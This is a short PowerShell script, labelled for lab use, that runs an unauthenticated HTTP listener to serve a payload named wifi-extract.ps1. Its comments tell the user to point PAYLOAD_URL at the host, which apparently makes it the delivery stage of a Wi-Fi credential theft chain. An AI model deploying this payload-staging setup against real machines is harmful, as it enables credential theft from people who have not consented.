# Sert wifi-extract.ps1 en HTTP local (lab). Adapter -Port / firewall si besoin.
param(
    [string]$Root = $PSScriptRoot,
    [int]$Port = 8765
)

$listener = [System.Net.HttpListener]::new()
$listener.Prefixes.Add("http://+:$Port/")
$listener.Start()
Write-Host "HTTP $Port -> $Root"
Write-Host "Mettre PAYLOAD_URL sur http://<IP-LAN>:$Port/wifi-extract.ps1"
Write-Host "Ctrl+C pour arrêter."

try {
    while ($listener.IsListening) {
        $ctx = $listener.GetContext()
        $path = $ctx.Request.Url.LocalPath.TrimStart('/')
        if (-not $path) { $path = 'wifi-extract.ps1' }
        $file = Join-Path $Root $path
        if (-not (Test-Path -LiteralPath $file)) {
            $ctx.Response.StatusCode = 404
            $ctx.Response.Close()
            continue
        }
        $bytes = [System.IO.File]::ReadAllBytes($file)
        $ctx.Response.ContentType = 'text/plain; charset=utf-8'
        $ctx.Response.OutputStream.Write($bytes, 0, $bytes.Length)
        $ctx.Response.Close()
        Write-Host "Served $path"
    }
} finally {
    $listener.Stop()
}